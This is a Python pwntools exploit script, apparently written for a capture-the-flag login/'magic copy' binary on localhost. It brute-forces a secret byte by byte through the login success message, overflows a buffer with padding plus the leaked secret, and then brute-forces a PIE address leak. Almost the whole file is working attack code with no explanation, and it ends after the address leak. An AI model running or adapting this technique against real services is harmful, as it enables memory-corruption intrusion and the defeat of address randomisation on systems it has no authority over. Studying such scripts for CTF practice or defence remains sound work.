from pwn import *
import sys

context.log_level = 'debug'

p = make_packer('all')
fd = remote("0", 7777)

fd.recvuntil(">>")

leak = ''

for i in range(16):
	for j in range(1, 256):
		fd.sendline("1")
		fd.recvuntil("Your passowrd :")
		fd.sendline(leak + p(j))
		msg = fd.recvuntil(">>")
		if "Login Success !" in msg:
			leak = leak + p(j)

			fd.sendline("1")
			fd.recvuntil(">>")
			break

print "urand leaked!!!!"

raw_input()


fd.send("1"*16); fd.recvuntil("Your passowrd :");
fd.send("A"*64 + leak); 
fd.recvuntil(">>")

fd.sendline("1"); fd.recvuntil("Your passowrd :")
fd.sendline(""); fd.recvuntil("Login Success !")

fd.send("3"*16); fd.recvuntil("Copy :")
fd.send("A"*63); fd.recvuntil("It is magic copy !")
raw_input()

	
fd.sendline("1"); fd.recvuntil(">>")

pie = ''

for i in range(6):
	for j in range(1, 256):
		if j == 10: continue
		fd.send("1"*16)
		fd.recvuntil("Your passowrd :")
		fd.sendline(leak + "1"*16 + pie + p(j))
		msg = fd.recvuntil(">>")
		if "Login Success !" in msg:
			pie = pie + p(j)

			fd.sendline("1")
			fd.recvuntil(">>")
			break

print "pie leaked!!!!"


fd.send("2"*16)
fd.recv()

raw_input()
